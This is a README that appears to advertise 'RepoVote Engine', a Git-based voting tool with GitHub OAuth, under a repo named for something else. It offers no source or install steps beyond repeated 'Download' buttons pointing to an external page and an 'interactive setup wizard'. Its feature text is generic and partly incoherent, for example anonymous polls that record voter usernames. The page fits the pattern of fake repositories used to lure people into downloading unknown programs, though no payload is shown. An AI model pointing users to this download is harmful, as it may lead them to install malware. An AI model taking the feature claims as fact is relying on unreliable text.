![preview](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/preview.svg)

# 📊 RepoVote Engine

**Decentralized Decision-Making, Powered by Your Git Repository**

Welcome to **RepoVote Engine** — a revolutionary open-source platform that reimagines how communities make collective decisions by embedding the voting process directly into your GitHub repository. Unlike traditional polling tools that require external authentication silos, RepoVote Engine leverages your existing Git infrastructure: every poll is a structured CSV file living in your repo, every commit is a ballot cast, and every merge request is a potential vote recount.

Think of your repository not just as a codebase, but as a living, breathing governance ledger. RepoVote Engine transforms static version control into a dynamic deliberation engine where contributors vote using the same tools they already trust — Git commands, pull requests, and branch protections. This is not another polling widget; it's a philosophical shift: **your code, your rules, your democracy**.

---

## 🌟 Why RepoVote Engine Exists

Modern collaboration tools suffer from three fatal flaws: **fragmented identity** (signing into yet another app), **invisible history** (votes vanish when the poll closes), and **centralized control** (platform owners can alter outcomes). RepoVote Engine eliminates all three by anchoring every vote to an immutable Git object.

When a developer votes, they create a commit in a designated branch — the commit hash becomes the timestamp, the GPG signature becomes the voter ID, and the diff against the poll CSV becomes their choice. No database, no session cookies, no opaque backend. Your Git history is your audit trail.

This repository contains the worker runtime that processes these CSV-based polls, validates voter eligibility against GitHub's OAuth scopes, and automatically merges approved results into a canonical `votes/main` branch. It's designed to run as a serverless function, a GitHub Action, or a self-hosted Node.js service.

---

## 🚀 Getting Started

[![Download](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/button.svg)](https://vegaleonele.github.io/github-polls-voter-auth/)

*Replace the above [![Download](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/button.svg)](https://vegaleonele.github.io/github-polls-voter-auth/) macro with your preferred installation method — our interactive setup wizard is available via the official distribution channel.*

---

### 📋 Prerequisites

Before deploying RepoVote Engine, ensure your environment supports:

- A GitHub repository with branch protection rules (optional but strongly recommended)
- Access to GitHub OAuth App credentials (Client ID and Client Secret)
- Node.js runtime (version 18 LTS or newer) for the worker
- A CSV parser capable of handling UTF-8 encoded files with BOM markers

---

### ⚙️ Configuration Architecture

RepoVote Engine follows a **configuration-as-code** philosophy. All settings are stored in a `voteconfig.yml` file at the root of your repository. Here's a minimal example:

```yaml
polls:
  - path: polls/feature-priority.csv
    voters: members
    approval_threshold: 0.6
    deadline: 2026-12-31T23:59:59Z
    anonymity: true
identity:
  provider: github
  required_org: your-org-name
  min_account_age_days: 30
output:
  results_branch: votes/consolidated
  notify_on_merge: true
```

Every parameter is validated against a JSON schema during initialization — if your config contains a typo, the worker will refuse to start and will output a detailed error message pointing to the exact line number.

---

## 🔑 Core Features

### 🗳️ CSV-Native Polling Engine

Each poll is a simple CSV file with columns you define. A typical poll might look like:

| Proposal | Voter | Choice | Timestamp |
|----------|-------|--------|-----------|
| Support Q3 roadmap? | octocat | yes | 2026-04-12T10:30:00Z |
| Support Q3 roadmap? | torvalds | no | 2026-04-12T11:15:00Z |

No proprietary formats, no database schemas. You can edit polls using any spreadsheet tool, commit them with `git add`, and track changes like any other file.

### 🔐 GitHub-Native Authentication

RepoVote Engine delegates all identity verification to GitHub's OAuth flow. When a voter initiates a session, they are redirected to GitHub, asked to authorize a minimal scope (`read:user` and `read:org`), and upon return, the worker generates a signed JWT containing their GitHub user ID, username, and organization membership status.

- **Anti-Sybil measures**: Configurable minimum account age prevents drive-by voting
- **Org-scoped eligibility**: Restrict voting to members of specific GitHub organizations or teams
- **One-vote-per-identity**: Enforced via commit SHA deduplication across poll branches

### 📈 Transparent Audit Trail

Every vote is a commit. The commit message follows a structured format:

```
[VOTE] Poll: feature-priority.csv | Choice: React-ecosystem | Voter: validated
```

The commit tree contains the updated CSV file with the voter's row appended. The entire history of a poll is visible through `git log --all polls/feature-priority.csv`. Malicious attempts to alter past votes create diverging histories that are immediately detectable.

### 🌐 Multilingual Interface

The web dashboard auto-detects the browser's language preference and serves localized strings for over 20 languages including English, Spanish, French, German, Japanese, Korean, and Arabic. Poll descriptions support Unicode, allowing proposal text in any script.

### 📱 Responsive and Accessible UI

Built on a lightweight web component architecture, the interface adapts seamlessly to mobile screens, tablets, and desktops. Every interactive element meets WCAG 2.1 AA standards — screen readers can narrate poll results, navigation is fully keyboard-accessible, and color schemes respect `prefers-color-scheme` values.

### 🛡️ 24/7 Worker Reliability

The worker includes a health-check endpoint that monitors:
- Filesystem access to the Git repository
- GitHub API rate limit utilization
- JWT signing key rotation
- CSV file integrity (checksum verification)

If any check fails, the worker returns an HTTP 503 status and logs a structured alert to a configurable webhook (e.g., PagerDuty or Slack).

---

## 📊 Use Cases and Metaphors

Think of RepoVote Engine as a **constitutional assembly for your codebase**. Every CSV file is a ballot initiative. Every pull request is a floor debate. Every merge is an enacted law.

| Scenario | How RepoVote Engine Helps |
|----------|---------------------------|
| **Open-source project governance** | Let maintainers vote on RFC proposals via pull requests |
| **Community feature prioritization** | Users vote on which issues to tackle next — votes are transparently recorded in the repo |
| **Organizational policy making** | Store team policies as CSV polls; track ratification history through Git |
| **Academic research consent** | Record informed consent for studies using immutable commit trails |

---

## 🧩 Architecture Overview

```
┌─────────────────┐     ┌──────────────────────┐     ┌─────────────────┐
│  GitHub OAuth   │◄────│  RepoVote Worker     │────►│  Git Repository  │
│  (identity)     │     │  (serverless/self)   │     │  (poll CSVs)     │
└─────────────────┘     └──────────────────────┘     └─────────────────┘
         │                       │                            │
         ▼                       ▼                            ▼
    User Browser           Vote Processing             Audit Log (commits)
```

The worker acts as an intermediary: it authenticates users via GitHub, validates their eligibility, writes votes as commits to a temporary branch, and when predefined thresholds are met, merges those votes into the canonical results branch.

---

## 📄 License

This project is released under the **MIT License**. You are free to use, modify, and distribute it for any purpose, including commercial applications, as long as you retain the original copyright notice. See the [LICENSE](https://opensource.org/licenses/MIT) file for full terms.

---

## 🧾 Disclaimer

**RepoVote Engine is provided "as is" without warranty of any kind, either express or implied.** While every effort has been made to ensure the integrity of vote recording through Git's cryptographic features, no system can guarantee absolute security against all attack vectors — including but not limited to compromised GitHub accounts, malicious repository administrators, or vulnerabilities in the underlying hardware.

- The developers assume no liability for disputes arising from poll results processed by this software.
- Voting outcomes should not be used as sole basis for legal decisions or resource allocation without independent verification.
- Always maintain offline backups of your poll data.

By using this software, you acknowledge that you have read this disclaimer and accept full responsibility for its deployment and outcomes.

---

## 🤝 Contributing

We welcome contributions that align with our mission of **decentralized, auditable governance**. To propose changes, please open a discussion first. All contributors must adhere to the [Contributor Covenant](https://www.contributor-covenant.org/) code of conduct.

---

## 📬 Support

For technical inquiries, please consult the wiki or open a GitHub Discussion. Our team monitors these channels during business hours in UTC+0 timezone. For urgent security vulnerabilities, contact the maintainers directly via the security tab.

---

[![Download](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/button.svg)](https://vegaleonele.github.io/github-polls-voter-auth/)